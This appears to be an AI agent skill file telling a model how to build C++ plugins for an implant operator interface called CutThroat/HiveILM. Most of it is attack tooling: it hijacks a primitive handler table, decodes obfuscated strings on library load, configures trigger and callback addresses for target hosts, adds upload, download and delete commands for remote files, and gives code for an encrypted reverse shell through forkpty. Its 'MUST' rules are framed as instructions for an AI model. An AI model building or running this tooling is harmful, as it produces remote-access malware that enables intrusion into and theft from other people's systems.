---
name: cutthroat-ilm-plugin
description: "Use when: building C++ shared library plugins for CutThroat ILM framework by hijacking primitive handler tables. Triggers: 'CutThroat ILM', 'plugin development', 'primitive handler', 'C++ plugin', 'framework integration'. NOT for: non-CutThroat frameworks, or when ILM isn't involved."
---

# CutThroat ILM SDK Plugin Architecture

## Overview

Shared library (.so) plugin pattern for the CutThroat operator interface. Uses GCC constructor/destructor attributes for auto-initialization, hijacks the ILM primitive reference table to register custom command handlers, and exposes trigger/listen/connect operations through a profile-based configuration system.

## Architecture

```
HiveILM (hive.cpp)
├── Constructor (auto-init on .so load)
│   ├── init_strings()         -- Decode obfuscated strings
│   ├── init_crypto_strings()  -- Decode crypto strings
│   └── primitiveRefTable[]    -- Hijack handlers
│       ├── 0x03000002 → TriggerAndListen
│       ├── 0x03000003 → Listen
│       ├── 0x03000004 → Trigger
│       ├── 0x08000003 → Execute
│       ├── 0x08000004 → Session
│       ├── 0x03000008 → Exit
│       ├── 0x02000003 → Put (upload)
│       ├── 0x02000009 → Get (download)
│       └── 0x02000005 → Delete
├── Listener (Ilm.cpp)        -- Accept callback connections
├── Trigger (Ilm.cpp)         -- Send wake-up triggers
├── Connection (Connection.cpp) -- SSL/TLS management
├── Command (Command.cpp)     -- Execute, Session, Exit, Shell
├── File (File.cpp)           -- Upload, Download, Delete
└── Utilities (Utilities.cpp) -- Helper functions
```

## Primitive Table Hijacking

```cpp
// In HiveILM constructor (called automatically on dlopen)
HiveILM::HiveILM() {
    init_strings();
    init_crypto_strings();

    // Register Connect (trigger + listen)
    primitiveRefTable[0x03000002]->handler = TriggerListenWrapper;
    primitiveRefTable[0x03000002]->currentlySupported = true;

    // Register Listen-only
    primitiveRefTable[0x03000003]->handler = ListenWrapper;
    primitiveRefTable[0x03000003]->currentlySupported = true;

    // Register Trigger-only
    primitiveRefTable[0x03000004]->handler = TriggerWrapper;
    primitiveRefTable[0x03000004]->currentlySupported = true;

    // File operations (disabled until connection established)
    primitiveRefTable[0x02000003]->handler = File::Put;
    primitiveRefTable[0x02000003]->currentlySupported = false;
    // ... additional handlers registered but initially disabled
}
```

## Wrapper Pattern

```cpp
// C++ member functions wrapped as free functions for primitive table
void ListenWrapper(Primitive::Activation& actvn,
                   ProcessCmdAccumulator& acc,
                   ProcessCmdResponse& resp) {
    myListener->Listen(actvn, acc, resp);
}

void TriggerListenWrapper(Primitive::Activation& actvn,
                          ProcessCmdAccumulator& acc,
                          ProcessCmdResponse& resp) {
    myListener->TriggerAndListen(actvn, acc, resp);
}
```

## Profile-Based Configuration

Pipe-delimited config files (CCS.xml) define operation parameters:
```
<profile>|<target_ip>|<callback_ip>|<callback_port>|<id_key>|<protocol>
```

## Command Set (CCS.xml)

Base64-encoded XML defining available primitives:
```xml
<CommandSet>
  <primitive id="0x03000002" name="Connect" />
  <primitive id="0x03000003" name="Listen" />
  <primitive id="0x03000004" name="Trigger" />
  <primitive id="0x08000003" name="Execute" />
  <primitive id="0x02000003" name="Put" />
  <primitive id="0x02000009" name="Get" />
  <primitive id="0x02000005" name="Delete" />
</CommandSet>
```

## Shell Command (v1.2+)

```cpp
// Opens encrypted reverse shell via forkpty + shuffle
// Falls back through: /bin/bash → /bin/ash → /bin/sh
void Command::Shell(Primitive::Activation& actvn, ...) {
    pid_t pid = forkpty(&master_fd, NULL, NULL, &ws);
    if (pid == 0) {
        setsid();
        execlp(shell, shell, NULL);
    }
    // Parent: shuffle() bidirectional encrypted I/O
    shuffle(ssl_fd, master_fd);
}
```

## Handler Enable/Disable Pattern

Handlers are registered but `currentlySupported = false` during construction. They are enabled when a connection is established (in `Ilm::Listen()`) and disabled when the connection closes. This prevents commands from being issued without an active implant session.

## Constraints

- MUST use `__attribute__((constructor))` for auto-initialization on library load
- MUST use `__attribute__((destructor))` for cleanup on library unload
- MUST register handlers in primitiveRefTable before enabling them
- MUST set `currentlySupported = false` for connection-dependent commands during init
- MUST call `init_strings()` and `init_crypto_strings()` in constructor
- SHOULD use wrapper functions to adapt member function signatures to primitive handler signatures
- MUST NOT call connection-dependent commands before `Listen()` enables them
- ALWAYS use `forkpty()` for shell sessions (not `fork()`) to allocate pseudo-terminal
